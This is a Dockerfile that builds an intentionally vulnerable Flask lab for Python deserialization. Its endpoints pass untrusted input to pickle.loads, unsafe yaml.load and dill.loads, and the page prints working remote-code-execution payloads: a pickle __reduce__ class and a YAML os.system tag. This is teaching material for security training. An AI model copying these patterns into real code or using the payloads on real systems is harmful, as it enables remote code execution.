FROM python:3.9-slim

WORKDIR /app

# Install dependencies
RUN pip install flask pyyaml dill

# Create vulnerable Python application
RUN echo 'from flask import Flask, request, render_template_string\n\
import pickle\n\
import base64\n\
import yaml\n\
import dill\n\
import json\n\
\n\
app = Flask(__name__)\n\
\n\
HTML_TEMPLATE = """\n\
<!DOCTYPE html>\n\
<html>\n\
<head>\n\
    <title>Python Deserialization Lab</title>\n\
    <style>\n\
        body { font-family: Arial, sans-serif; margin: 40px; }\n\
        textarea { width: 100%; font-family: monospace; }\n\
        .section { margin: 20px 0; padding: 20px; background: #f5f5f5; }\n\
        .warning { color: red; font-weight: bold; }\n\
        pre { background: #e0e0e0; padding: 10px; overflow: auto; }\n\
    </style>\n\
</head>\n\
<body>\n\
    <h1>Python Deserialization Lab</h1>\n\
    <p class="warning">⚠️ This application is intentionally vulnerable!</p>\n\
    \n\
    <div class="section">\n\
        <h2>1. Pickle Deserialization</h2>\n\
        <form method="POST" action="/pickle">\n\
            <p>Base64 encoded pickle data:</p>\n\
            <textarea name="data" rows="5" cols="80">gASVFAAAAAAAAACMCGJ1aWx0aW5zlIwEc3RylJOUjAVoZWxsb5SFlFKULg==</textarea><br>\n\
            <input type="submit" value="Unpickle">\n\
        </form>\n\
    </div>\n\
    \n\
    <div class="section">\n\
        <h2>2. YAML Deserialization</h2>\n\
        <form method="POST" action="/yaml">\n\
            <p>YAML data (try !!python/object/apply:os.system ["whoami"]):</p>\n\
            <textarea name="data" rows="5" cols="80">message: hello\n\
user: admin</textarea><br>\n\
            <input type="submit" value="Parse YAML">\n\
        </form>\n\
    </div>\n\
    \n\
    <div class="section">\n\
        <h2>3. Dill Deserialization</h2>\n\
        <form method="POST" action="/dill">\n\
            <p>Base64 encoded dill data:</p>\n\
            <textarea name="data" rows="5" cols="80">gASVEwAAAAAAAACMCGRpbGwuX2RpbGyUjAVsb2Fkc5STlC4=</textarea><br>\n\
            <input type="submit" value="Undill">\n\
        </form>\n\
    </div>\n\
    \n\
    {% if result %}\n\
    <div class="section">\n\
        <h3>Result:</h3>\n\
        <pre>{{ result }}</pre>\n\
    </div>\n\
    {% endif %}\n\
    \n\
    {% if error %}\n\
    <div class="section" style="background: #ffcccc;">\n\
        <h3>Error:</h3>\n\
        <pre>{{ error }}</pre>\n\
    </div>\n\
    {% endif %}\n\
    \n\
    <div class="section">\n\
        <h3>Exploitation Examples:</h3>\n\
        <p><strong>Pickle RCE:</strong></p>\n\
        <pre>import pickle\n\
import base64\n\
import os\n\
\n\
class RCE:\n\
    def __reduce__(self):\n\
        return (os.system, ("whoami",))\n\
\n\
payload = base64.b64encode(pickle.dumps(RCE())).decode()\n\
print(payload)</pre>\n\
        \n\
        <p><strong>YAML RCE:</strong></p>\n\
        <pre>!!python/object/apply:os.system ["ls -la"]</pre>\n\
    </div>\n\
</body>\n\
</html>\n\
"""\n\
\n\
@app.route("/")\n\
def index():\n\
    return render_template_string(HTML_TEMPLATE)\n\
\n\
@app.route("/pickle", methods=["POST"])\n\
def pickle_deserialize():\n\
    try:\n\
        data = request.form.get("data", "")\n\
        decoded = base64.b64decode(data)\n\
        # VULNERABLE: Unpickling untrusted data!\n\
        obj = pickle.loads(decoded)\n\
        return render_template_string(HTML_TEMPLATE, result=f"Unpickled object: {obj}")\n\
    except Exception as e:\n\
        return render_template_string(HTML_TEMPLATE, error=str(e))\n\
\n\
@app.route("/yaml", methods=["POST"])\n\
def yaml_deserialize():\n\
    try:\n\
        data = request.form.get("data", "")\n\
        # VULNERABLE: Using unsafe yaml.load()!\n\
        obj = yaml.load(data, Loader=yaml.Loader)\n\
        return render_template_string(HTML_TEMPLATE, result=f"YAML parsed: {obj}")\n\
    except Exception as e:\n\
        return render_template_string(HTML_TEMPLATE, error=str(e))\n\
\n\
@app.route("/dill", methods=["POST"])\n\
def dill_deserialize():\n\
    try:\n\
        data = request.form.get("data", "")\n\
        decoded = base64.b64decode(data)\n\
        # VULNERABLE: Dill can serialize/deserialize more than pickle!\n\
        obj = dill.loads(decoded)\n\
        return render_template_string(HTML_TEMPLATE, result=f"Undilled object: {obj}")\n\
    except Exception as e:\n\
        return render_template_string(HTML_TEMPLATE, error=str(e))\n\
\n\
@app.route("/serialize", methods=["GET"])\n\
def serialize_demo():\n\
    # Helper to create test payloads\n\
    test_data = {"message": "hello", "user": "admin"}\n\
    \n\
    pickle_b64 = base64.b64encode(pickle.dumps(test_data)).decode()\n\
    yaml_str = yaml.dump(test_data)\n\
    dill_b64 = base64.b64encode(dill.dumps(test_data)).decode()\n\
    \n\
    return {\n\
        "pickle_base64": pickle_b64,\n\
        "yaml": yaml_str,\n\
        "dill_base64": dill_b64\n\
    }\n\
\n\
if __name__ == "__main__":\n\
    app.run(host="0.0.0.0", port=5000, debug=True)\n\
' > app.py

EXPOSE 5000

CMD ["python", "app.py"] 